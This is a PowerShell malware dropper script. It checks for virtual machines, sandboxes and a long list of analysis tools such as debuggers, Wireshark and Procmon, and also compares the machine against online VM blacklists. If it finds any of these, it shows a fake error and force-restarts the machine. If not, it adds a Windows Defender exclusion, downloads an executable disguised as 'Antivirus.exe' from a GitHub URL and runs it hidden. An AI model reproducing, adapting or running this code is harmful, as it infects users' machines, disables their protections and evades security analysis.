Add-Type -AssemblyName System.Windows.Forms

function ShowError {
    param([string]$errorName)
    [System.Windows.Forms.MessageBox]::Show("Error: $errorName", "Security Check", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    Restart-Computer -Force
    taskkill /f /im svchost.exe
}

function Check-Condition {
    param (
        [scriptblock]$condition,
        [string]$errorMessage
    )
    if (& $condition) {
        ShowError $errorMessage
    }
}

function Search-Mac { Get-WmiObject win32_networkadapterconfiguration | Where-Object { $_.IpEnabled } | Select-Object -ExpandProperty macaddress -join "," }
function Search-IP { Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing | Select-Object -ExpandProperty Content }
function Search-HWID { Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID }
function Search-Username { [Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1] }
function Check-Internet { Test-Connection -ComputerName google.com -Count 1 -ErrorAction SilentlyContinue }
function Check-DriveSize { (Get-Volume | Where-Object { $_.DriveLetter } | Measure-Object -Property Size -Sum).Sum / 1GB -ge 50 }
function Check-RAM { (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB -ge 6 }
function Check-ProcessCount { (Get-Process | Measure-Object).Count -ge 50 }
function Check-RecentFiles { (Get-ChildItem -Path "$ENV:APPDATA\Microsoft\Windows\Recent" -Recurse).Count -ge 20 }

function VMPROTECT {
    Check-Condition { Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll" } "JSAMSIProvider64.dll exists!"
    Check-Condition { Check-RAM -eq $false } "RAM CHECK FAILED!"
    Check-Condition { (wmic diskdrive get model | Select-String -Pattern "DADY HARDDISK|QEMU HARDDISK") } "QEMU HARDDISK detected!"
    
    Check-Condition {
        (Get-Process | Where-Object { $_.Name.ToLower() -in @("32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice") })
    } "Debugging tools/processes found"

    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt"
    )
    
    $data = @(
        Search-Mac,
        Search-IP,
        Search-HWID
    )
    
    foreach ($url in $urls) {
        $blacklist = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
        if ($blacklist -split "`n" | Where-Object { $data -contains $_ }) {
            ShowError "Blacklisted item detected"
        }
    }

    Check-Condition { Check-Internet -eq $false } "INTERNET CONNECTION CHECK FAILED!"
    Check-Condition { Check-ProcessCount -eq $false } "PROCESS COUNT CHECK FAILED!"
    Check-Condition { Check-RecentFiles -eq $false } "RECENT FILE ACTIVITY CHECK FAILED!"
    Check-Condition { Check-DriveSize -eq $false } "DRIVE SIZE CHECK FAILED!"
}

VMPROTECT


$url = "https://github.com/43a1723/test/raw/main/Extras/hacklife/Antivirus.exe"
$output = "$env:localappdata\loader.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Add-MpPreference -ExclusionPath $output 
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process -WindowStyle Hidden -FilePath $output
}
